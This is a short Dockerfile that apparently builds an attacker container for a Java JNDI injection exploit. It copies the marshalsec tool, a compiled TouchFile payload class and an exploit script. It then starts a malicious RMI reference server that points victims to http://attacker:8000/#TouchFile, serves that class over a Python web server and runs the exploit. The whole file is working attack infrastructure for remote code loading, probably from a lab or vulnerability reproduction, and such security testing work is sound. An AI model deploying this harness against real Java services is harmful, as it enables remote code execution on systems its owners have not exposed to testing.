FROM openjdk:8-jre-alpine
WORKDIR /exploit
RUN apk add --no-cache curl python3
COPY marshalsec-0.0.3-SNAPSHOT-all.jar .
COPY TouchFile.class .
COPY exploit.sh .
RUN chmod +x /exploit/exploit.sh

CMD sh -c "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://attacker:8000/#TouchFile 9999 & \
python3 -m http.server 8000 & \
sh /exploit/exploit.sh && tail -f /dev/null"

